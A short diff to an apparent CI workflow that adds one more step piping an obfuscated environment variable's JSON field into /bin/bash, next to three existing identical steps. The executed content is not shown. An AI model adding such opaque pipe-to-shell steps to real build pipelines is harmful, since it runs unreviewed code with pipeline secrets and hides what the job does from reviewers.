@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$bm58" | jq -r .uea20676 | /bin/bash
           printf '%s' "$g42" | jq -r .be7363 | /bin/bash
           printf '%s' "$yn203" | jq -r .qxrp9161 | /bin/bash
+          printf '%s' "$qyi55" | jq -r .ldpa0 | /bin/bash
 
       - name: Upload results
         if: always()
